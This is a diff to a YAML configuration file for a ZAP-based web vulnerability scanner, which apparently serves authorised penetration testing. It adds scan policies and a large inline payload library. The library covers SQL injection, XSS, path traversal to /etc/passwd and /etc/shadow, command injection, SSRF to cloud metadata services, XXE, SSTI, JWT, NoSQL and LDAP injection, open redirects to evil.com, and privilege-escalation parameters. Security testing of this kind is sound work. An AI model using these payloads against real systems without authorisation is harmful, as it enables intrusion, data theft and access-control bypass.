@@ -1,11 +1,9 @@
-# ZAP Scanner Configuration
+# ZAP Scanner Configuration - Expert Pentester Edition
 
-# Domains to include in scan (empty = all domains)
-scope_domains:
-# - "example.com"
-# - "api.example.com"
-
-# Domains to exclude from scan
+# =============================================================================
+# SCOPE
+# =============================================================================
+scope_domains: []
 exclude_domains:
   - "google-analytics.com"
   - "googletagmanager.com"
@@ -14,26 +12,100 @@ exclude_domains:
   - "cdn.jsdelivr.net"
   - "fonts.googleapis.com"
   - "ajax.googleapis.com"
+  - "hotjar.com"
+  - "newrelic.com"
+  - "sentry.io"
+  - "segment.io"
+  - "intercom.io"
+  - "zendesk.com"
 
-# HTTP methods to process
 allowed_methods:
   - GET
   - POST
   - PUT
   - DELETE
   - PATCH
+  - OPTIONS
 
-# Docker ZAP configuration
+# =============================================================================
+# ZAP CONFIGURATION
+# =============================================================================
 zap_port: 8080
 zap_image: "ghcr.io/zaproxy/zaproxy:stable"
 
-# Scan options
+# =============================================================================
+# SCAN SETTINGS
+# =============================================================================
 scan_fuzzable_urls: true
 scan_api_endpoints: true
 max_scan_time: 300
+max_urls: 100
+max_workers: 10
+incremental: false
 
-# Red Team attack payloads
+# Rate limiting
+rate_limit: 10.0
+rate_burst: 20
+
+# =============================================================================
+# SCAN POLICIES
+# =============================================================================
+scan_policies:
+  - name: "SQL Injection"
+    enabled: true
+    threshold: "High"
+    scanners:
+      - 40018  # SQL Injection
+      - 40019  # SQL Injection - MySQL
+      - 40020  # SQL Injection - PostgreSQL
+      - 40021  # SQL Injection - Oracle
+      - 40022  # SQL Injection - SQLite
+      - 90018  # SQL Injection - Hypersonic
+  - name: "Cross-Site Scripting"
+    enabled: true
+    threshold: "Medium"
+    scanners:
+      - 40012  # XSS Reflected
+      - 40014  # XSS Persistent
+      - 40016  # XSS DOM
+      - 40017  # XSS DOM-based
+  - name: "Path Traversal"
+    enabled: true
+    threshold: "High"
+    scanners:
+      - 6       # Path Traversal
+      - 40003  # CRLF Injection
+  - name: "Command Injection"
+    enabled: true
+    threshold: "High"
+    scanners:
+      - 90020  # Remote OS Command Injection
+  - name: "IDOR"
+    enabled: true
+    threshold: "High"
+
+alert_thresholds:
+  high: 5
+  medium: 10
+  low: 20
+
+# =============================================================================
+# RED TEAM ATTACK PAYLOADS
+# =============================================================================
+# Full payload library in: payloads/
+# Structure:
+#   payloads/injection/  - sqli, nosql, ldap, command
+#   payloads/xss/        - reflected, dom, polyglot
+#   payloads/traversal/  - lfi, rfi
+#   payloads/ssrf/       - basic, cloud, protocols
+#   payloads/auth/       - bypass, jwt, mass_assignment, hidden_params
+#   payloads/misc/       - ssti, xxe, prototype, headers, redirect
+
+payload_directory: "./payloads"
+
+# Legacy inline payloads (for backwards compatibility)
 red_team_payloads:
+  # Privilege Escalation / Mass Assignment
   mass_assignment:
     - '{"role": "admin"}'
     - '{"is_admin": true}'
@@ -45,17 +117,261 @@ red_team_payloads:
     - '{"account_type": "premium"}'
     - '{"credits": 999999}'
     - '{"balance": 999999}'
+    - '{"role": "root"}'
+    - '{"access_level": 9999}'
+    - '{"user_type": "admin"}'
+    - '{"verified": true}'
+    - '{"email_verified": true}'
+    - '{"is_staff": true}'
+    - '{"is_moderator": true}'
+    - '{"can_delete": true}'
+    - '{"can_edit_users": true}'
+    - '{"subscription": "enterprise"}'
+    - '{"plan": "unlimited"}'
+    - '{"quota": -1}'
+    - '{"rate_limit": 999999}'
+    - '{"password_reset_required": false}'
+    - '{"mfa_enabled": false}'
+    - '{"locked": false}'
+    - '{"banned": false}'
+    - '{"approved": true}'
+
+  # Hidden/Debug Parameters
   hidden_parameters:
     - "debug=true"
     - "test=1"
     - "admin=true"
     - "debug=1"
-    - "test=true"
     - "internal=true"
     - "dev=true"
     - "trace=true"
     - "verbose=1"
     - "show_errors=true"
+    - "_debug=1"
+    - "x-debug=true"
+    - "x-forwarded-admin=true"
+    - "access=admin"
+    - "role=admin"
+    - "sudo=true"
+    - "preview=true"
+    - "staging=true"
+    - "beta=true"
+    - "canary=true"
+    - "feature_flags=all"
+    - "bypass_auth=true"
+    - "skip_validation=true"
+    - "raw=true"
+    - "format=debug"
+    - "log_level=debug"
+    - "profiler=true"
+    - "x-request-id=admin"
+    - "x-real-ip=127.0.0.1"
+    - "x-original-url=/admin"
+    - "x-rewrite-url=/admin"
+    - "x-custom-ip-authorization=127.0.0.1"
 
-# Race condition test configuration
-race_condition_requests: 50
+  # SQL Injection payloads
+  sqli:
+    - "' OR '1'='1"
+    - "' OR '1'='1' --"
+    - "' OR '1'='1' /*"
+    - "1' OR '1'='1"
+    - "1 OR 1=1"
+    - "1' OR '1'='1' --"
+    - "' UNION SELECT NULL--"
+    - "' UNION SELECT NULL,NULL--"
+    - "' UNION SELECT NULL,NULL,NULL--"
+    - "1'; WAITFOR DELAY '0:0:5'--"
+    - "1' AND SLEEP(5)--"
+    - "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+    - "1; SELECT pg_sleep(5)--"
+    - "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"
+    - "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--"
+    - "' AND 1=CONVERT(int,(SELECT @@version))--"
+
+  # XSS payloads
+  xss:
+    - "<script>alert(1)</script>"
+    - "<img src=x onerror=alert(1)>"
+    - "<svg onload=alert(1)>"
+    - "javascript:alert(1)"
+    - "<body onload=alert(1)>"
+    - "<iframe src='javascript:alert(1)'>"
+    - "<input onfocus=alert(1) autofocus>"
+    - "<marquee onstart=alert(1)>"
+    - "<video><source onerror=alert(1)>"
+    - "<audio src=x onerror=alert(1)>"
+    - "<details open ontoggle=alert(1)>"
+    - "'><script>alert(1)</script>"
+    - "\"><script>alert(1)</script>"
+    - "'-alert(1)-'"
+    - "<ScRiPt>alert(1)</ScRiPt>"
+    - "<svg/onload=alert(1)>"
+    - "<x onclick=alert(1)>click"
+    - "{{constructor.constructor('alert(1)')()}}"
+
+  # Path Traversal / LFI
+  path_traversal:
+    - "../../../etc/passwd"
+    - "..\\..\\..\\windows\\system32\\config\\sam"
+    - "....//....//....//etc/passwd"
+    - "..%2f..%2f..%2fetc/passwd"
+    - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+    - "..%252f..%252f..%252fetc/passwd"
+    - "/etc/passwd%00"
+    - "file:///etc/passwd"
+    - "/proc/self/environ"
+    - "/var/log/apache2/access.log"
+    - "php://filter/convert.base64-encode/resource=index.php"
+    - "php://input"
+    - "/etc/shadow"
+    - "C:\\Windows\\System32\\drivers\\etc\\hosts"
+
+  # Command Injection
+  command_injection:
+    - "; id"
+    - "| id"
+    - "|| id"
+    - "& id"
+    - "&& id"
+    - "; whoami"
+    - "| whoami"
+    - "; cat /etc/passwd"
+    - "; ls -la"
+    - "; sleep 5"
+    - "| sleep 5"
+    - "&& sleep 5"
+    - "|| sleep 5"
+
+  # SSRF
+  ssrf:
+    - "http://127.0.0.1"
+    - "http://localhost"
+    - "http://[::1]"
+    - "http://0.0.0.0"
+    - "http://169.254.169.254/latest/meta-data/"
+    - "http://metadata.google.internal/computeMetadata/v1/"
+    - "http://100.100.100.200/latest/meta-data/"
+    - "file:///etc/passwd"
+    - "dict://127.0.0.1:11211/stats"
+    - "gopher://127.0.0.1:25/_HELO"
+    - "http://127.0.0.1:22"
+    - "http://127.0.0.1:3306"
+    - "http://127.0.0.1:6379"
+    - "http://127.1"
+    - "http://0177.0.0.1"
+    - "http://2130706433"
+    - "http://0x7f000001"
+
+  # XXE
+  xxe:
+    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><foo>&xxe;</foo>'
+
+  # SSTI
+  ssti:
+    - "{{7*7}}"
+    - "${7*7}"
+    - "<%= 7*7 %>"
+    - "#{7*7}"
+    - "*{7*7}"
+    - "{{config}}"
+    - "{{self}}"
+    - "{{''.__class__.__mro__[2].__subclasses__()}}"
+    - "${{<%[%'\"}}%\\."
+
+  # JWT attacks
+  jwt:
+    - '{"alg":"none"}'
+    - '{"alg":"HS256","typ":"JWT"}'
+    - 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0'
+
+  # NoSQL Injection
+  nosql:
+    - '{"$gt": ""}'
+    - '{"$ne": null}'
+    - '{"$where": "sleep(5000)"}'
+    - '{"$regex": ".*"}'
+    - "' || '1'=='1"
+    - '{"username": {"$regex": "^admin"}}'
+    - '{"password": {"$ne": ""}}'
+
+  # LDAP Injection
+  ldap:
+    - "*"
+    - "*)(&"
+    - "*)(uid=*))(|(uid=*"
+    - "admin)(&)"
+    - "x])(cn=*))(|(cn=[x"
+
+  # Header Injection / CRLF
+  header_injection:
+    - "localhost\r\nX-Injected: true"
+    - "localhost%0d%0aX-Injected:%20true"
+    - "%0d%0aSet-Cookie:%20malicious=true"
+
+  # Open Redirect
+  open_redirect:
+    - "//evil.com"
+    - "https://evil.com"
+    - "//evil.com/%2f.."
+    - "/\\evil.com"
+    - "///evil.com"
+    - "////evil.com"
+    - "https:evil.com"
+    - "http://evil.com"
+    - "//evil%E3%80%82com"
+
+  # Prototype Pollution
+  prototype_pollution:
+    - '{"__proto__":{"admin":true}}'
+    - '{"constructor":{"prototype":{"admin":true}}}'
+    - '__proto__[admin]=true'
+    - 'constructor[prototype][admin]=true'
+
+# Race Condition
+race_condition_requests: 100
+
+# =============================================================================
+# GRAPHQL SETTINGS
+# =============================================================================
+graphql:
+  enabled: true
+  introspection_timeout: 30
+  max_depth: 10
+  batch_limit: 100
+  dos_test_size: 1000
+
+# =============================================================================
+# WEBSOCKET SETTINGS
+# =============================================================================
+websocket:
+  enabled: true
+  timeout: 30
+  max_messages: 100
+
+# =============================================================================
+# NOTIFICATIONS
+# =============================================================================
+webhooks: []
+
+# =============================================================================
+# OWASP TOP 10 COMPLIANCE
+# =============================================================================
+owasp:
+  enabled: true
+  version: "2021"
+  fail_on_categories:
+    - "A01:2021"  # Broken Access Control
+    - "A03:2021"  # Injection
+
+# =============================================================================
+# REPORTING
+# =============================================================================
+reporting:
+  formats:
+    - json
+    - sarif
+  include_curl: true
+  include_timeline: true
+  executive_summary: true
